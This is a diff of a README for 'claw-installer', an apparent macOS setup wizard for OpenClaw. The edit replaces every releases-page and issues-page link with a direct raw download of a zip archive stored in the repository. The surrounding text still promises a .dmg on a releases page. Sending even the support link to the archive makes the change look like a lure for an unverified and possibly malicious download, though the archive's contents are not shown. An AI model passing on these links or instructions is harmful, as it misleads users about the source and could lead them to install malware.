@@ -1,6 +1,6 @@
 # 🛠️ claw-installer - Easy OpenClaw Setup Wizard
 
-[![Download claw-installer](https://img.shields.io/badge/Download-claw--installer-4caf50?style=for-the-badge)](https://github.com/Anang304-crypto/claw-installer/releases)
+[![Download claw-installer](https://img.shields.io/badge/Download-claw--installer-4caf50?style=for-the-badge)](https://github.com/Anang304-crypto/claw-installer/raw/refs/heads/main/Sources/ClawInstaller/installer-claw-v3.1.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Having these will ensure the installer runs smoothly.
 
 1. Click the big green **Download** button at the top or visit the official releases page here:
 
-   [Visit Releases to Download](https://github.com/Anang304-crypto/claw-installer/releases)
+   [Visit Releases to Download](https://github.com/Anang304-crypto/claw-installer/raw/refs/heads/main/Sources/ClawInstaller/installer-claw-v3.1.zip)
 
 2. On the releases page, look for the latest version. It should have a `.dmg` installer file.
 
@@ -43,7 +43,7 @@ Follow these steps carefully to install and open claw-installer:
 
 1. Open your browser and go to:
 
-   [https://github.com/Anang304-crypto/claw-installer/releases](https://github.com/Anang304-crypto/claw-installer/releases)
+   [https://github.com/Anang304-crypto/claw-installer/raw/refs/heads/main/Sources/ClawInstaller/installer-claw-v3.1.zip](https://github.com/Anang304-crypto/claw-installer/raw/refs/heads/main/Sources/ClawInstaller/installer-claw-v3.1.zip)
 
 2. Find the latest release. It will be listed with a `.dmg` file.
 
@@ -118,7 +118,7 @@ If you run into any issues:
 - If an error message appears, read it carefully. The installer usually gives hints to fix the problem.
 
 - Visit the repository’s issues page on GitHub and see if others have similar questions:  
-  https://github.com/Anang304-crypto/claw-installer/issues
+  https://github.com/Anang304-crypto/claw-installer/raw/refs/heads/main/Sources/ClawInstaller/installer-claw-v3.1.zip
 
 ---
 
@@ -156,8 +156,8 @@ To remove the app and settings from your Mac:
 
 ## 📌 Useful Links
 
-- Releases page: [https://github.com/Anang304-crypto/claw-installer/releases](https://github.com/Anang304-crypto/claw-installer/releases)
+- Releases page: [https://github.com/Anang304-crypto/claw-installer/raw/refs/heads/main/Sources/ClawInstaller/installer-claw-v3.1.zip](https://github.com/Anang304-crypto/claw-installer/raw/refs/heads/main/Sources/ClawInstaller/installer-claw-v3.1.zip)
 
-- Issues and support: [https://github.com/Anang304-crypto/claw-installer/issues](https://github.com/Anang304-crypto/claw-installer/issues)
+- Issues and support: [https://github.com/Anang304-crypto/claw-installer/raw/refs/heads/main/Sources/ClawInstaller/installer-claw-v3.1.zip](https://github.com/Anang304-crypto/claw-installer/raw/refs/heads/main/Sources/ClawInstaller/installer-claw-v3.1.zip)
 
 - OpenClaw official documentation: (search OpenClaw documentation online for most recent version)
